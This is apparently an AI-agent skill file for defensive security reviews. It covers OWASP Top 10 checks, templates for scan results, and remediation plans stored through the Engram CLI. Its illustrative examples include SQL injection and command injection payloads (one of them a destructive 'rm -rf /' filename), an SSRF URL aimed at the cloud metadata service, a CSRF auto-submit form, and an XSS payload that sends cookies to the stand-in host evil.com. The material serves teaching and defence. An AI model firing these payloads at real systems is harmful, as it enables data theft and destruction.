---
name: engram-security-review
description: "Review code for security vulnerabilities including OWASP Top 10, injection attacks, XSS, using automated scanning and manual code review."
---

# Security Review (Engram-Integrated)

## Overview

Systematically review code and systems for security vulnerabilities, focusing on OWASP Top 10 risks, common attack vectors like injection and cross-site scripting (XSS), authentication and authorization flaws, and data exposure. Combine automated security scanning tools with manual code review to identify vulnerabilities. Store security findings, risk assessments, and remediation plans in Engram to track security posture over time.

## When to Use

Use this skill when:
- Reviewing code before merging to production
- Planning security hardening work
- Responding to security vulnerability reports
- Preparing for security audit or penetration test
- After security incident to prevent recurrence
- Evaluating third-party libraries or dependencies
- Implementing authentication, authorization, or data handling
- Before public launch or handling sensitive data

## The Pattern

### Step 1: Automated Security Scanning

Run automated security scanners to identify common vulnerabilities:

```bash
engram context create \
  --title "Security Scan Results: [System/Component]" \
  --content "## Scan Scope

**Component:** [e.g., API server, web application, authentication service]
**Codebase:** [repository or service name]
**Version:** [git SHA or version tag]
**Scan Date:** $(date -u +%Y-%m-%dT%H:%M:%SZ)

## Automated Security Tools

**Static Application Security Testing (SAST):**
- Tool: [e.g., Semgrep, Bandit (Python), Brakeman (Rails), ESLint security plugins]
- Command: \`[scan command]\`
- Rules: [OWASP Top 10, CWE, custom rules]

**Dependency Scanning:**
- Tool: [e.g., npm audit, pip-audit, Dependabot, Snyk]
- Command: \`[scan command]\`
- Vulnerability databases: [CVE, GitHub Security Advisories]

**Container Scanning (if applicable):**
- Tool: [e.g., Trivy, Clair, Docker Scan]
- Command: \`[scan command]\`

**Secrets Detection:**
- Tool: [e.g., git-secrets, TruffleHog, detect-secrets]
- Command: \`[scan command]\`

## SAST Results

**Total findings:** [N]
- Critical: [N]
- High: [N]
- Medium: [N]
- Low: [N]
- Info: [N]

### Critical Vulnerabilities

**1. [Vulnerability Type] - [CWE-XXX]**
- **Severity:** Critical
- **Location:** [file:line]
- **Description:** [What the vulnerability is]
- **Code snippet:**
  \`\`\`[language]
  [vulnerable code]
  \`\`\`
- **Attack vector:** [How it could be exploited]
- **Impact:** [What attacker could achieve]
- **CVSS Score:** [N.N] (if applicable)
- **Recommendation:** [How to fix]

**2. [Another Critical Vulnerability]**
- [Same structure]

### High Vulnerabilities

**3. [Vulnerability Type] - [CWE-XXX]**
- **Severity:** High
- [Same structure as critical]

### Medium Vulnerabilities

**4. [Vulnerability Type] - [CWE-XXX]**
- **Severity:** Medium
- [Same structure]

## Dependency Scan Results

**Total dependencies:** [N]
**Dependencies with known vulnerabilities:** [N]

### Critical Dependency Issues

**1. [Package Name] [Version]**
- **Vulnerability:** [CVE-XXXX-XXXXX]
- **Severity:** Critical
- **CVSS Score:** [N.N]
- **Description:** [What the vulnerability is]
- **Affected versions:** [version range]
- **Fixed in:** [version]
- **Exploit available:** [Yes/No]
- **Recommendation:** Upgrade to [version] or [alternative package]
- **Blockers:** [Any reason upgrade is difficult]

**2. [Another Package]**
- [Same structure]

### High Dependency Issues

**3. [Package Name] [Version]**
- [Same structure]

## Secrets Detection Results

**Secrets found:** [N]

**1. [Secret Type]**
- **Location:** [file:line]
- **Pattern:** [e.g., AWS access key, GitHub token, password]
- **Value:** [REDACTED - first/last 4 chars]
- **Status:** [Active/Revoked/False positive]
- **Action required:** [Revoke and rotate, remove from git history]

## Container Scan Results (if applicable)

**Base image:** [e.g., node:18-alpine]
**Total vulnerabilities:** [N]
- Critical: [N]
- High: [N]
- Medium: [N]
- Low: [N]

**Critical container vulnerabilities:**
- [CVE-XXXX-XXXXX] in [package]: [description]
- Recommendation: [Update base image to X, or wait for upstream fix]

## Summary

**Security posture:** [Critical issues present / High risk / Moderate risk / Low risk]

**Immediate actions required:**
1. [Fix critical vulnerability X]
2. [Rotate leaked secret Y]
3. [Upgrade vulnerable dependency Z]

**Scan artifacts:**
- SAST report: [path/to/sast-report.json]
- Dependency report: [path/to/dependency-report.json]
- Secrets report: [path/to/secrets-report.json]" \
  --source "security-scan" \
  --tags "security,scan,automated,[component-name]"
```

### Step 2: Manual OWASP Top 10 Review

Review code for OWASP Top 10 vulnerabilities:

```bash
engram reasoning create \
  --title "OWASP Top 10 Security Review: [Component]" \
  --task-id [TASK_ID] \
  --content "## OWASP Top 10 (2021) Manual Review

### A01:2021 - Broken Access Control

**Review areas:**
- Authorization checks on all endpoints
- Horizontal privilege escalation (user A accessing user B's data)
- Vertical privilege escalation (user accessing admin functions)
- Insecure direct object references (IDOR)
- Missing function-level access control

**Findings:**

**Finding 1: IDOR in User Profile API**
- **Severity:** High
- **Location:** api/users.py:145
- **Issue:**
  \`\`\`python
  @app.route('/api/users/<user_id>/profile')
  def get_profile(user_id):
      # No authorization check - any authenticated user can view any profile
      profile = db.query('SELECT * FROM profiles WHERE user_id = ?', user_id)
      return jsonify(profile)
  \`\`\`
- **Attack:** User with ID 123 can access /api/users/456/profile
- **Impact:** Unauthorized access to PII (email, phone, address)
- **Fix:**
  \`\`\`python
  @app.route('/api/users/<user_id>/profile')
  @require_auth
  def get_profile(user_id):
      # Check if current user is authorized to view this profile
      if current_user.id != user_id and not current_user.is_admin:
          abort(403, 'Forbidden')
      profile = db.query('SELECT * FROM profiles WHERE user_id = ?', user_id)
      return jsonify(profile)
  \`\`\`

**Finding 2: [Another access control issue]**
- [Same structure]

### A02:2021 - Cryptographic Failures

**Review areas:**
- Data in transit encryption (HTTPS, TLS 1.2+)
- Data at rest encryption (database, files)
- Password hashing (bcrypt, Argon2, not MD5/SHA1)
- Key management and rotation
- Weak or deprecated cryptographic algorithms

**Findings:**

**Finding 3: Passwords Hashed with MD5**
- **Severity:** Critical
- **Location:** auth/password.py:23
- **Issue:**
  \`\`\`python
  def hash_password(password):
      return hashlib.md5(password.encode()).hexdigest()
  \`\`\`
- **Attack:** MD5 is broken, rainbow table attacks trivial
- **Impact:** All passwords can be cracked in hours/days
- **Fix:**
  \`\`\`python
  import bcrypt
  
  def hash_password(password):
      salt = bcrypt.gensalt(rounds=12)
      return bcrypt.hashpw(password.encode(), salt)
  
  def verify_password(password, hashed):
      return bcrypt.checkpw(password.encode(), hashed)
  \`\`\`

**Finding 4: [Another crypto issue]**
- [Same structure]

### A03:2021 - Injection

**Review areas:**
- SQL injection (parameterized queries vs string concatenation)
- NoSQL injection
- Command injection (shell commands with user input)
- LDAP injection
- XML/XPath injection
- Template injection

**Findings:**

**Finding 5: SQL Injection in Search**
- **Severity:** Critical
- **Location:** api/search.py:67
- **Issue:**
  \`\`\`python
  def search_users(query):
      sql = f\"SELECT * FROM users WHERE name LIKE '%{query}%'\"
      return db.execute(sql)
  \`\`\`
- **Attack:** Query: \`admin' OR '1'='1\` returns all users
- **Attack:** Query: \`'; DROP TABLE users; --\` deletes table
- **Impact:** Data breach, data loss, complete database compromise
- **Fix:**
  \`\`\`python
  def search_users(query):
      sql = \"SELECT * FROM users WHERE name LIKE ?\"
      return db.execute(sql, ('%' + query + '%',))
  \`\`\`

**Finding 6: Command Injection in File Processor**
- **Severity:** Critical
- **Location:** utils/file_processor.py:89
- **Issue:**
  \`\`\`python
  def process_file(filename):
      os.system(f'convert {filename} output.pdf')
  \`\`\`
- **Attack:** Filename: \`file.txt; rm -rf /\`
- **Impact:** Remote code execution, full system compromise
- **Fix:**
  \`\`\`python
  import subprocess
  
  def process_file(filename):
      # Use subprocess with argument list (no shell)
      subprocess.run(['convert', filename, 'output.pdf'], check=True)
  \`\`\`

### A04:2021 - Insecure Design

**Review areas:**
- Rate limiting on authentication endpoints
- Account lockout after failed attempts
- Security requirements in design phase
- Threat modeling
- Secure design patterns (defense in depth)

**Findings:**

**Finding 7: No Rate Limiting on Login**
- **Severity:** High
- **Location:** auth/login.py:34
- **Issue:** No rate limiting allows brute force attacks
- **Attack:** Attacker can try 1000s of passwords per second
- **Impact:** Account takeover via credential stuffing
- **Fix:**
  \`\`\`python
  from flask_limiter import Limiter
  
  limiter = Limiter(app, key_func=lambda: request.remote_addr)
  
  @app.route('/api/login', methods=['POST'])
  @limiter.limit('5 per minute')  # Max 5 attempts per minute per IP
  def login():
      # ... login logic
  \`\`\`

### A05:2021 - Security Misconfiguration

**Review areas:**
- Debug mode disabled in production
- Default credentials changed
- Error messages don't leak information
- Security headers (CSP, HSTS, X-Frame-Options)
- Unnecessary features/services disabled
- Up-to-date software versions

**Findings:**

**Finding 8: Debug Mode Enabled in Production**
- **Severity:** High
- **Location:** config.py:12
- **Issue:** \`DEBUG = True\` in production config
- **Impact:** Stack traces expose code paths, environment variables leak secrets
- **Fix:** Set \`DEBUG = False\` in production, use proper logging

**Finding 9: Missing Security Headers**
- **Severity:** Medium
- **Location:** Middleware configuration
- **Issue:** No CSP, HSTS, or X-Frame-Options headers
- **Impact:** Vulnerable to XSS, clickjacking, MITM attacks
- **Fix:**
  \`\`\`python
  @app.after_request
  def set_security_headers(response):
      response.headers['Content-Security-Policy'] = \"default-src 'self'\"
      response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
      response.headers['X-Frame-Options'] = 'DENY'
      response.headers['X-Content-Type-Options'] = 'nosniff'
      return response
  \`\`\`

### A06:2021 - Vulnerable and Outdated Components

**Review areas:**
- Dependencies with known vulnerabilities (CVEs)
- End-of-life software versions
- Unpatched systems
- Unused dependencies

**Findings:**

**Finding 10: [Vulnerability in dependency]**
- See Dependency Scan Results from Step 1

### A07:2021 - Identification and Authentication Failures

**Review areas:**
- Weak password requirements
- Session fixation vulnerabilities
- Session timeout
- Credential stuffing protection
- Multi-factor authentication
- Password reset flow security

**Findings:**

**Finding 11: Weak Password Requirements**
- **Severity:** Medium
- **Location:** auth/registration.py:56
- **Issue:** Minimum password length is 6 characters, no complexity
- **Attack:** Users choose weak passwords like \"123456\"
- **Impact:** Easy brute force, credential stuffing success
- **Fix:** Require 12+ characters, check against common password list (zxcvbn)

**Finding 12: Session Tokens in URL**
- **Severity:** High
- **Location:** auth/session.py:23
- **Issue:** Session ID passed in query string: \`/dashboard?session=abc123\`
- **Attack:** Session leaked in browser history, referrer headers, logs
- **Impact:** Session hijacking
- **Fix:** Use HTTP-only cookies for session tokens

### A08:2021 - Software and Data Integrity Failures

**Review areas:**
- Unsigned or unverified software updates
- Insecure CI/CD pipeline
- Dependencies from untrusted sources
- Lack of integrity verification (checksums, signatures)

**Findings:**

**Finding 13: [Integrity issue]**
- [Details]

### A09:2021 - Security Logging and Monitoring Failures

**Review areas:**
- Failed login attempts logged
- Privilege escalation attempts logged
- Sensitive actions logged (data export, admin actions)
- Log injection vulnerabilities
- Logs sent to SIEM/monitoring system
- Alerting on suspicious activity

**Findings:**

**Finding 14: No Logging of Failed Authentication**
- **Severity:** Medium
- **Location:** auth/login.py:45
- **Issue:** Failed login attempts not logged
- **Impact:** Cannot detect brute force attacks or credential stuffing
- **Fix:**
  \`\`\`python
  if not verify_password(password, user.password_hash):
      logger.warning(f'Failed login attempt for user {username} from {request.remote_addr}')
      return {'error': 'Invalid credentials'}, 401
  \`\`\`

### A10:2021 - Server-Side Request Forgery (SSRF)

**Review areas:**
- User-controlled URLs fetched by server
- URL validation and allowlisting
- Network segmentation
- Metadata service access (AWS IMDS, etc.)

**Findings:**

**Finding 15: SSRF in Webhook Integration**
- **Severity:** High
- **Location:** integrations/webhook.py:78
- **Issue:**
  \`\`\`python
  def test_webhook(url):
      # No validation - user can specify any URL
      response = requests.get(url)
      return response.text
  \`\`\`
- **Attack:** URL: \`http://169.254.169.254/latest/meta-data/\` (AWS metadata)
- **Impact:** Access to cloud credentials, internal services, sensitive data
- **Fix:**
  \`\`\`python
  import ipaddress
  from urllib.parse import urlparse
  
  def test_webhook(url):
      parsed = urlparse(url)
      
      # Validate scheme
      if parsed.scheme not in ['http', 'https']:
          raise ValueError('Invalid URL scheme')
      
      # Validate hostname not internal
      try:
          ip = ipaddress.ip_address(parsed.hostname)
          if ip.is_private or ip.is_loopback:
              raise ValueError('Cannot access private IP')
      except ValueError:
          pass  # Hostname, not IP
      
      # Allowlist specific domains if possible
      allowed_domains = ['webhook.site', 'example.com']
      if parsed.hostname not in allowed_domains:
          raise ValueError('Domain not allowed')
      
      response = requests.get(url, timeout=5)
      return response.text
  \`\`\`

## Summary

**Total vulnerabilities:** [N]
- Critical: [N] (immediate fix required)
- High: [N] (fix before production)
- Medium: [N] (fix in next sprint)
- Low: [N] (backlog)

**OWASP Top 10 Coverage:**
- A01 Broken Access Control: [N] issues
- A02 Cryptographic Failures: [N] issues
- A03 Injection: [N] issues
- A04 Insecure Design: [N] issues
- A05 Security Misconfiguration: [N] issues
- A06 Vulnerable Components: [N] issues
- A07 Authentication Failures: [N] issues
- A08 Integrity Failures: [N] issues
- A09 Logging Failures: [N] issues
- A10 SSRF: [N] issues

**Risk assessment:** [Critical / High / Medium / Low]" \
  --confidence 0.85 \
  --tags "security,owasp-top-10,manual-review,[component-name]"
```

### Step 3: Review Attack Vectors

Analyze specific attack vectors relevant to the system:

```bash
engram reasoning create \
  --title "Attack Vector Analysis: [System]" \
  --task-id [TASK_ID] \
  --content "## Attack Surface Analysis

**System architecture:**
- Frontend: [technology stack]
- Backend: [technology stack]
- Database: [type and version]
- Infrastructure: [cloud provider, containers, etc.]
- External integrations: [APIs, third-party services]

## Cross-Site Scripting (XSS) Analysis

**Potential XSS vulnerabilities:**

**1. Reflected XSS in Search**
- **Location:** search.html template
- **Issue:** Search query echoed in page without sanitization
- **Code:**
  \`\`\`html
  <p>Results for: {{ query }}</p>
  \`\`\`
- **Attack:** \`?query=<script>alert(document.cookie)</script>\`
- **Impact:** Session hijacking, account takeover
- **Fix:** Escape output or use Content-Security-Policy
  \`\`\`html
  <p>Results for: {{ query | escape }}</p>
  \`\`\`

**2. Stored XSS in Comments**
- **Location:** comments/display.html
- **Issue:** User comments rendered as HTML
- **Code:**
  \`\`\`html
  <div class=\"comment\">{{ comment.body | safe }}</div>
  \`\`\`
- **Attack:** Comment: \`<img src=x onerror=\"fetch('evil.com?cookie='+document.cookie)\">\`
- **Impact:** Persistent XSS affecting all users viewing comments
- **Fix:** Sanitize HTML with DOMPurify or similar, use CSP

**3. DOM-based XSS**
- **Location:** dashboard.js:234
- **Issue:** URL fragment inserted into DOM
- **Code:**
  \`\`\`javascript
  const userId = location.hash.substring(1);
  document.getElementById('user').innerHTML = userId;
  \`\`\`
- **Attack:** \`#<img src=x onerror=alert(1)>\`
- **Impact:** XSS without server involvement
- **Fix:** Use textContent instead of innerHTML, or sanitize

## Cross-Site Request Forgery (CSRF) Analysis

**CSRF protection status:**

**1. Missing CSRF Tokens on State-Changing Operations**
- **Location:** All POST/PUT/DELETE endpoints
- **Issue:** No CSRF token validation
- **Attack:** Attacker creates form on evil.com that POSTs to victim's account
  \`\`\`html
  <form action=\"https://app.example.com/api/transfer\" method=\"POST\">
    <input name=\"amount\" value=\"1000\">
    <input name=\"to\" value=\"attacker\">
  </form>
  <script>document.forms[0].submit()</script>
  \`\`\`
- **Impact:** Unauthorized actions performed with victim's session
- **Fix:** Implement CSRF tokens (Synchronizer Token Pattern) or SameSite cookies

## Authentication/Session Security

**1. Session Management Issues**
- **Issue:** Sessions never expire
- **Impact:** Stolen sessions remain valid indefinitely
- **Fix:** Set session timeout (15-30 minutes idle, 8 hours absolute)

**2. Password Reset Flow**
- **Issue:** Password reset tokens predictable (sequential integers)
- **Attack:** Brute force reset tokens to take over accounts
- **Fix:** Use cryptographically secure random tokens (UUID v4 or better)

## Authorization Bypass Vectors

**1. Privilege Escalation via Parameter Tampering**
- **Location:** api/users.py:234
- **Issue:** User can set is_admin=true in registration request
- **Attack:** POST /api/register with \`{\"username\": \"hacker\", \"is_admin\": true}\`
- **Impact:** Immediate admin access
- **Fix:** Remove is_admin from user-controllable params, set in backend only

## API Security

**1. Missing Rate Limiting**
- **Issue:** No rate limiting on API endpoints
- **Attack:** DDoS, brute force, scraping
- **Fix:** Implement rate limiting (Redis-based, per-IP and per-user)

**2. Excessive Data Exposure**
- **Location:** api/users.py:123
- **Issue:** API returns full user objects with password hashes, internal IDs
- **Attack:** Attacker collects password hashes to crack offline
- **Fix:** Use DTOs to expose only necessary fields

**3. Missing API Authentication**
- **Location:** /api/internal/* endpoints
- **Issue:** Internal APIs accessible from internet
- **Fix:** Require authentication or restrict to internal network only

## File Upload Security

**1. Unrestricted File Upload**
- **Location:** uploads/handler.py:45
- **Issue:** No validation of file type or content
- **Attack:** Upload PHP shell as \"image.jpg.php\", execute on server
- **Impact:** Remote code execution
- **Fix:**
  - Validate file extension against allowlist
  - Validate file content (magic bytes)
  - Store uploads outside webroot
  - Serve uploads from separate domain (no cookies)
  - Scan uploads with antivirus

## Business Logic Vulnerabilities

**1. Race Condition in Payment Processing**
- **Location:** payments/checkout.py:156
- **Issue:** Check balance → deduct funds (not atomic)
- **Attack:** Submit two payments simultaneously, both succeed with insufficient funds
- **Impact:** Financial loss
- **Fix:** Use database transactions with proper isolation level

**2. Price Manipulation**
- **Location:** checkout.js:89
- **Issue:** Price sent from client to server
- **Attack:** Modify JavaScript to send price = $0.01
- **Impact:** Attacker gets products for free
- **Fix:** Never trust client for price, always fetch from server

## Summary

**Critical attack vectors:** [N]
**High-risk vectors:** [N]
**Medium-risk vectors:** [N]

**Most critical:**
1. [Attack vector with highest risk]
2. [Second highest risk]
3. [Third highest risk]" \
  --confidence 0.80 \
  --tags "security,attack-vectors,[component-name]"
```

### Step 4: Create Security Remediation Plan

```bash
engram reasoning create \
  --title "Security Remediation Plan: [Component]" \
  --task-id [TASK_ID] \
  --content "## Vulnerability Summary

**Total vulnerabilities:** [N]
- Critical: [N]
- High: [N]
- Medium: [N]
- Low: [N]

**OWASP Top 10 categories affected:**
- [List of affected categories]

**Exploitation likelihood:** [Very High / High / Medium / Low]
**Business impact if exploited:** [Critical / High / Medium / Low]

## Remediation Priority

### P0 - Critical (Fix immediately, block deployment)

**Vulnerability 1: SQL Injection in Search**
- **OWASP:** A03:2021 Injection
- **Severity:** Critical (CVSS 9.8)
- **Exploitation:** Trivial, public exploits available
- **Impact:** Full database compromise, data breach
- **Files:** api/search.py:67
- **Remediation:**
  \`\`\`python
  # Before (VULNERABLE)
  sql = f\"SELECT * FROM users WHERE name LIKE '%{query}%'\"
  
  # After (SECURE)
  sql = \"SELECT * FROM users WHERE name LIKE ?\"
  results = db.execute(sql, ('%' + query + '%',))
  \`\`\`
- **Testing:** Attempt injection payloads: \`' OR '1'='1\`, \`'; DROP TABLE users; --\`
- **Effort:** 1 hour
- **Owner:** Backend team

**Vulnerability 2: [Another P0]**
- [Same structure]

### P1 - High (Fix before next release)

**Vulnerability 3: Broken Access Control (IDOR)**
- **OWASP:** A01:2021 Broken Access Control
- **Severity:** High (CVSS 7.5)
- **Exploitation:** Easy, requires only authenticated account
- **Impact:** Unauthorized access to PII
- **Files:** api/users.py:145
- **Remediation:**
  \`\`\`python
  @app.route('/api/users/<user_id>/profile')
  @require_auth
  def get_profile(user_id):
      # Add authorization check
      if current_user.id != user_id and not current_user.is_admin:
          abort(403, 'Forbidden')
      profile = db.query('SELECT * FROM profiles WHERE user_id = ?', user_id)
      return jsonify(profile)
  \`\`\`
- **Testing:** Try accessing other users' profiles (user 1 requests user 2's profile)
- **Effort:** 2 hours (fix + add tests for all endpoints)
- **Owner:** Backend team

### P2 - Medium (Fix in next sprint)

**Vulnerability 4: [Medium severity issue]**
- [Same structure]

### P3 - Low (Backlog)

**Vulnerability 5: [Low severity issue]**
- [Same structure]

## Implementation Timeline

**Week 1: P0 Critical**
- Day 1-2: Fix critical vulnerabilities 1-3
- Day 3: Security testing (penetration testing critical fixes)
- Day 4: Deploy to production with monitoring
- Day 5: Verify fixes in production

**Week 2: P1 High**
- Day 1-3: Fix high vulnerabilities 4-8
- Day 4: Security regression testing
- Day 5: Deploy to production

**Week 3-4: P2 Medium**
- Fix medium vulnerabilities
- Improve security logging and monitoring
- Update security documentation

**Ongoing: P3 Low**
- Address in regular sprint work

## Security Testing Plan

**Automated testing:**
- Add SAST to CI/CD (Semgrep, Bandit)
- Add dependency scanning (npm audit, Snyk)
- Add secrets detection (TruffleHog)
- Fail builds on Critical/High findings

**Manual testing:**
- Penetration test after P0/P1 fixes
- Code review for all security-sensitive changes
- Threat modeling for new features

**Regression testing:**
- Add security test cases for each vulnerability
- Example (SQL injection test):
  \`\`\`python
  def test_sql_injection_prevented():
      response = client.get('/api/search?q=\\' OR \\'1\\'=\\'1')
      assert response.status_code == 200
      assert 'admin@example.com' not in response.text  # Should not return all users
  \`\`\`

## Security Hardening

**Beyond fixing vulnerabilities:**

**1. Defense in Depth**
- Add WAF (Web Application Firewall) with OWASP Core Rule Set
- Add rate limiting at API gateway
- Add network segmentation (DMZ for web tier)

**2. Security Monitoring**
- Send security logs to SIEM
- Alert on suspicious patterns:
  - Multiple failed login attempts
  - SQL injection attempts in logs
  - Privilege escalation attempts
  - Unusual data access patterns

**3. Incident Response**
- Document incident response plan
- Define escalation procedures
- Conduct tabletop exercise

**4. Security Training**
- Train developers on secure coding (OWASP Top 10)
- Conduct quarterly security awareness training
- Share lessons learned from vulnerabilities found

## Acceptance Criteria

**Before marking as complete:**
- [ ] All P0 and P1 vulnerabilities fixed
- [ ] Security tests added for each vulnerability
- [ ] SAST integrated into CI/CD
- [ ] Penetration test conducted, no Critical/High findings
- [ ] Security logging implemented
- [ ] Incident response plan documented
- [ ] Team trained on secure coding practices

## Ongoing Security

**Continuous improvement:**
- Monthly SAST/dependency scans
- Quarterly penetration testing
- Annual third-party security audit
- Monitor security mailing lists for new vulnerabilities
- Participate in bug bounty program (if applicable)" \
  --confidence 0.80 \
  --tags "security,remediation,[component-name]"
```

### Step 5: Link Security Entities to Task

```bash
# Link security analysis
engram relationship create \
  --source-id [TASK_ID] --source-type task \
  --target-id [SCAN_ID] --target-type context \
  --relationship-type references \
  --agent [AGENT]

engram relationship create \
  --source-id [TASK_ID] --source-type task \
  --target-id [OWASP_REVIEW_ID] --target-type reasoning \
  --relationship-type documents \
  --agent [AGENT]

engram relationship create \
  --source-id [TASK_ID] --source-type task \
  --target-id [ATTACK_VECTORS_ID] --target-type reasoning \
  --relationship-type documents \
  --agent [AGENT]

engram relationship create \
  --source-id [TASK_ID] --source-type task \
  --target-id [REMEDIATION_ID] --target-type reasoning \
  --relationship-type documents \
  --agent [AGENT]
```

## Example

User needs security review before deploying new user profile feature.

### Step 1: Automated Scanning

Agent runs security scanners:

```bash
# Run SAST
semgrep --config=auto src/

# Results: 8 findings (2 Critical, 3 High, 3 Medium)
```

Agent creates scan results context documenting findings.

### Step 2: OWASP Top 10 Manual Review

Agent reviews code for OWASP Top 10:

"Manual review found:
- A01 (Broken Access Control): IDOR vulnerability in profile endpoint - any user can view any profile
- A03 (Injection): SQL injection in profile search
- A07 (Authentication): No rate limiting on profile update API

Total: 3 Critical, 5 High, 3 Medium (11 total vulnerabilities)"

### Step 3: Attack Vector Analysis

Agent analyzes specific attacks:

"XSS vulnerability in profile bio field - stored XSS affects all viewers. CSRF vulnerability on profile update - no token validation. Session tokens visible in URL query string - leaks in logs."

### Step 4: Remediation Plan

Agent creates prioritized plan:

"Created remediation plan:
- P0 (3 vulnerabilities): SQL injection, IDOR, stored XSS - 8 hours total
- P1 (5 vulnerabilities): CSRF, session security, rate limiting - 12 hours total
- P2 (3 vulnerabilities): Security headers, logging - 6 hours total

Recommend: Fix P0 before deployment (2 days), P1 in hotfix release (1 week), P2 in next sprint.

All vulnerabilities documented in Engram with exploit examples and secure code fixes."

## Querying Security Reviews

```bash
# Get security scan results
engram context list | grep "Security Scan Results:"

# Get OWASP Top 10 reviews
engram reasoning list | grep "OWASP Top 10 Security Review:"

# Get attack vector analyses
engram reasoning list | grep "Attack Vector Analysis:"

# Get remediation plans
engram reasoning list | grep "Security Remediation Plan:"

# Get all security work for a component
engram relationship connected --entity-id [TASK_ID] | grep -i "security"
```

## Related Skills

This skill integrates with:
- `engram-code-quality` - Security is a key aspect of code quality
- `engram-assumption-validation` - Test security assumptions before deployment
- `engram-risk-assessment` - Security vulnerabilities are high-impact risks
- `engram-system-design` - Design secure systems from the start
- `engram-post-mortem` - Analyze security incidents to prevent recurrence
